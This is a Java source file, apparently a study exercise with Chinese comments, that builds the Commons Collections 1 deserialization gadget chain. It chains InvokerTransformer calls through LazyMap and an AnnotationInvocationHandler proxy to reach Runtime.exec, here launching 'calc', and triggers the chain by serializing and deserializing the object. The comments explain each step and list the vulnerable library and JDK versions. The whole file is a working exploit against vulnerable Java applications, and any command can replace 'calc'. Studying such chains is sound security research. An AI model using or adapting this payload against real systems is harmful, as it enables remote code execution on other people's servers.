package CC;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.LazyMap;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;
import java.util.HashMap;
import java.util.Map;

public class CommonsCollections1  {

    /**
     * 3.1-3.2.1 jdk版本小于u71
     *
     * ->AnnotationInvocationHandler.readObject()
     *       ->mapProxy.entrySet().iterator()  //动态代理类
     *           ->AnnotationInvocationHandler.invoke()
     *             ->LazyMap.get()
     *                 ->ChainedTransformer.transform()
     *                 ->ConstantTransformer.transform()
     *                     ->InvokerTransformer.transform()
     *                     ->…………
     *
     * Q：为什么这里需要序列化
     * A：因为需要调用readObject函数，这个函数是Annotion重写的函数，非java原生
     * Q：为什么需要调用readObject函数
     * A：因为该函数中调用了get方法遍历了自身类型为Map的memberValues属性，并对Entry对象执行setVaule操作
     * Q：为什么一定需要调用get方法？
     * A：因为需要lazyMap的get方法会调用transform方法。
     * Q：为什么一定要调用transform方法？
     * A：因为transform方法中通过反射，调用指定方法，可以传入特定的对象，来执行系统命令
     *
     * @param args
     */
    public static void main(String[] args) {
        //Transformer数组
        Transformer[] transformers = new Transformer[] {
                new ConstantTransformer(Runtime.class),
                //思考：为什么第二个参数有的是两个值，有的是一个值；很简单，因为该方法的定义就需要这两个参数类型，第三个参数就是给前面的方法指定参数
                new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", new Class[0]}),
                //invoke方法的第一个参数是null，表示调用静态方法；第二个参数是一个空的Object数组，表示调用的方法没有参数。这个调用的结果是返回null，因为我们没有指定要调用的
                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]}),
                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"})
        };

        //ChainedTransformer实例
        Transformer chainedTransformer = new ChainedTransformer(transformers);
        //LazyMap实例
        Map uselessMap = new HashMap();
        Map lazyMap = LazyMap.decorate(uselessMap,chainedTransformer);

        try {
            //AnnotationInvocationHandler注解的动态代理
            //反射获取AnnotationInvocationHandler实例
            Class clazz = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
            Constructor constructor = clazz.getDeclaredConstructor(Class.class, Map.class);
            constructor.setAccessible(true);
            //这里创建handle是为根据LazyMap创建动态代理对象，因为Annotation自动实现了InvocationHandle接口，所以这里可以直接转换
            InvocationHandler handler = (InvocationHandler) constructor.newInstance(Override.class, lazyMap);

            //动态代理类，设置一个D代理对象，为了触发 AnnotationInvocationHandler#invoke
            Map mapProxy = (Map) Proxy.newProxyInstance(LazyMap.class.getClassLoader(), LazyMap.class.getInterfaces(), handler);

            InvocationHandler handler1 = (InvocationHandler) constructor.newInstance(Override.class, mapProxy);

            //序列化
            //这里使用jdk281会报错，org.apache.commons.collections.functors.InvokerTransformer的序列化序列化被禁用
            ByteArrayOutputStream baos = new ByteArrayOutputStream();
            ObjectOutputStream oos = new ObjectOutputStream(baos);
            oos.writeObject(handler1);
            oos.flush();
            oos.close();

            //测试反序列化
            ByteArrayInputStream bais = new ByteArrayInputStream(baos.toByteArray());
            ObjectInputStream ois = new ObjectInputStream(bais);
            ois.readObject();
            ois.close();

        } catch (Exception e) {
            e.printStackTrace();
        }

    }
}
